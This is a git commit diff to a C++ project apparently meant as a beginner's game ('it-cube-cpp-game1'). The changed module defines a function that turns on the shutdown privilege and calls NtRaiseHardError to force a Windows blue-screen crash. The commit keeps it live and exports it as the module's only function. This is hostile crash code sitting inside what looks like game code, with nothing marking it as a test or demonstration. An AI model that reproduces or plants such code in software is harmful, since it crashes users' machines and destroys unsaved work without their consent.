4081dbb0e12075f845c2bb31b8bfad5f8f4f5200
MasterCont <kirill-guchkov@yandex.ru>
2024-11-16 20:42:17 +0300

    fix

--- it-cube-cpp-game1/modules.cpp
+++ it-cube-cpp-game1/modules.cpp
@@ -3,10 +3,11 @@
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
 
-void hitcing()
+int hitcing()
 {
 	BOOLEAN b;
 	unsigned long response;
 	RtlAdjustPrivilege(19, true, false, &b);
 	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+	return 0;
 }
--- it-cube-cpp-game1/modules.h
+++ it-cube-cpp-game1/modules.h
@@ -1,8 +1,2 @@
 #pragma once
-
-extern int map_number;
-
-void static Move(char m);
-void static UI_Map();
-void static Render_map();
-void hitcing();
+int hitcing();
